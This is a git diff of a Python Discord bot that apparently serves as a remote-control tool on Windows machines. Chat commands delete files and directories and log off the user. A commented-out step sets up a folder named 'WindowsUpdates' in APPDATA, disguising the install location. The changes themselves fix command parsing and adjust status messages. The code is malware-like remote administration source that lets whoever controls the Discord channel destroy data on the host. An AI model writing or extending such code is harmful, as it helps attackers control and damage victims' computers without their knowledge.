@@ -31,7 +31,7 @@ def list_modules():
 
 @client.event
 async def on_ready():
-    print(f"Bot started.")
+    print(f"Bot started. Version: " + "1.0.6")
     """
     if os.path.exists(f"{os.getenv('APPDATA')}\\WindowsUpdates") == False:
         os.mkdir(f"{os.getenv('APPDATA')}\\WindowsUpdates")
@@ -262,7 +262,7 @@ async def on_message(message):
         os.system("shutdown -l")
 
     #DELETE
-    if message.content.startswith(".delete"):
+    if message.content.startswith(".delete") and not message.content.startswith(".deletedir"):
         file_path = message.content.replace(".delete ", "")
         await message.delete()
         try:
@@ -307,16 +307,19 @@ async def on_message(message):
 
     #DELETE DIR
     if message.content.startswith(".deletedir"):
+        path = message.content.replace(".deletedir ", "")
+        print(path)
         await message.delete()
         try:
-            os.rmdir(message.content.replace(".deletedir ", ""))
+            os.rmdir(path)
         except Exception as e:
             print(e)
-            embed = discord.Embed(title="Delete Directory", description="Failed to delete directory. Usage: ``.deletedir <FULL DIRECTORY PATH>``\nIf you want to delete files use the ``.delete`` command!", color=0x00ff00)
+            embed = discord.Embed(title="Delete Directory", description="Failed to delete directory.", color=0x00ff00)
             await message.channel.send(embed=embed)
             return
-        embed = discord.Embed(title="Delete Directory",description=f"Directory {message.content.replace('.deletedir ', '')} deleted.", color=0x00ff00)
+        embed = discord.Embed(title="Delete Directory", description="Directory deleted.", color=0x00ff00)
         await message.channel.send(embed=embed)
+        
     
     #CREATE DIR
     if message.content.startswith(".createdir"):
